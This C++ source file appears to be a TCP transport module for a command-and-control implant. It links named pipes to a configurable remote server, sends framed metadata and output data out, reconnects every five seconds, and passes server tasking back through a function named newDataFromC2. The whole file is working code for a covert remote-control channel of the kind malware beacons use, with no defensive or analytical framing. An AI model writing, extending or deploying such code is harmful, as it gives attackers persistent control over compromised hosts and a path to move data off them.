#include "CommunicationNamedPipes.h"

#include <atomic>
#include <chrono>
#include <condition_variable>
#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <functional>
#include <mutex>
#include <string>
#include <thread>
#include <vector>

#include <netdb.h>
#include <sys/socket.h>
#include <unistd.h>

namespace {
constexpr uint32_t maxFrameBytes = 64u * 1024u * 1024u;
constexpr int reconnectSeconds = 5;

bool readAll(int fd, void* output, size_t length) {
    uint8_t* bytes = static_cast<uint8_t*>(output);
    while (length != 0) {
        const ssize_t count = ::recv(fd, bytes, length, 0);
        if (count <= 0)
            return false;
        bytes += count;
        length -= static_cast<size_t>(count);
    }
    return true;
}

bool writeAll(int fd, const void* input, size_t length) {
    const uint8_t* bytes = static_cast<const uint8_t*>(input);
    while (length != 0) {
        const ssize_t count = ::send(fd, bytes, length, MSG_NOSIGNAL);
        if (count <= 0)
            return false;
        bytes += count;
        length -= static_cast<size_t>(count);
    }
    return true;
}

bool writeLength(int fd, uint32_t value) {
    const uint8_t bytes[] = {
        static_cast<uint8_t>(value), static_cast<uint8_t>(value >> 8),
        static_cast<uint8_t>(value >> 16), static_cast<uint8_t>(value >> 24)};
    return writeAll(fd, bytes, sizeof(bytes));
}

bool readLength(int fd, uint32_t& value) {
    uint8_t bytes[4];
    if (!readAll(fd, bytes, sizeof(bytes)))
        return false;
    value = static_cast<uint32_t>(bytes[0]) |
            (static_cast<uint32_t>(bytes[1]) << 8) |
            (static_cast<uint32_t>(bytes[2]) << 16) |
            (static_cast<uint32_t>(bytes[3]) << 24);
    return value <= maxFrameBytes;
}

bool writeFrame(int fd, const std::vector<uint8_t>& metadata,
                const std::vector<uint8_t>& data) {
    return metadata.size() <= maxFrameBytes && data.size() <= maxFrameBytes &&
           writeLength(fd, static_cast<uint32_t>(metadata.size())) &&
           writeAll(fd, metadata.data(), metadata.size()) &&
           writeLength(fd, static_cast<uint32_t>(data.size())) &&
           writeAll(fd, data.data(), data.size());
}

int connectTcp(const std::string& host, const std::string& port) {
    addrinfo hints = {};
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    addrinfo* addresses = nullptr;
    if (::getaddrinfo(host.c_str(), port.c_str(), &hints, &addresses) != 0)
        return -1;
    int fd = -1;
    for (addrinfo* address = addresses; address; address = address->ai_next) {
        fd = ::socket(address->ai_family, address->ai_socktype, address->ai_protocol);
        if (fd < 0)
            continue;
        if (::connect(fd, address->ai_addr, address->ai_addrlen) == 0)
            break;
        ::close(fd);
        fd = -1;
    }
    ::freeaddrinfo(addresses);
    if (fd >= 0) {
        const int enabled = 1;
        ::setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &enabled, sizeof(enabled));
    }
    return fd;
}

class Session {
public:
    void set(int connectedFd) {
        std::lock_guard<std::mutex> lock(mutex_);
        fd_ = connectedFd;
        changed_.notify_all();
    }

    void clear(int connectedFd) {
        std::lock_guard<std::mutex> lock(mutex_);
        if (fd_ == connectedFd) {
            fd_ = -1;
            ::shutdown(connectedFd, SHUT_RDWR);
        }
    }

    void send(const std::vector<uint8_t>& metadata, const std::vector<uint8_t>& data) {
        for (;;) {
            std::unique_lock<std::mutex> lock(mutex_);
            changed_.wait(lock, [this] { return fd_ >= 0; });
            if (writeFrame(fd_, metadata, data))
                return;
            const int failedFd = fd_;
            fd_ = -1;
            ::shutdown(failedFd, SHUT_RDWR);
        }
    }

private:
    std::mutex mutex_;
    std::condition_variable changed_;
    int fd_ = -1;
};

void sendLoop(CommunicationNamedPipes& pipe, Session& session) {
    for (;;) {
        const std::vector<uint8_t> data = pipe.getDataToSend();
        if (data.empty()) {
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
            continue;
        }
        const std::vector<uint8_t> metadata = pipe.getMetadata();
        if (!metadata.empty())
            session.send(metadata, data);
    }
}

void serve(CommunicationNamedPipes& pipe, const std::string& host, const std::string& port) {
    Session session;
    std::thread sender(sendLoop, std::ref(pipe), std::ref(session));
    sender.detach();
    for (;;) {
        const int fd = connectTcp(host, port);
        if (fd >= 0) {
            const std::vector<uint8_t> metadata = pipe.getMetadata();
            if (!metadata.empty() && writeFrame(fd, metadata, {})) {
                session.set(fd);
                uint32_t length;
                while (readLength(fd, length)) {
                    std::vector<uint8_t> data(length);
                    if (!readAll(fd, data.data(), length))
                        break;
                    pipe.newDataFromC2(data);
                }
                session.clear(fd);
            }
            ::close(fd);
        }
        std::this_thread::sleep_for(std::chrono::seconds(reconnectSeconds));
    }
}
}

extern "C" void run(char* pipeNameRead, char* pipeNameWrite) {
    if (!pipeNameRead || !pipeNameWrite)
        return;
    CommunicationNamedPipes pipe(pipeNameRead, pipeNameWrite, nullptr);
    const std::vector<uint8_t> configuration = pipe.connect();
    const std::string address(configuration.begin(), configuration.end());
    const size_t separator = address.rfind(':');
    if (separator == std::string::npos || separator == 0 || separator + 1 == address.size())
        return;
    const std::string host = address.substr(0, separator);
    const std::string port = address.substr(separator + 1);
    char* end = nullptr;
    const long numericPort = std::strtol(port.c_str(), &end, 10);
    if (numericPort < 1 || numericPort > 65535 || *end != '\0')
        return;
    serve(pipe, host, port);
}
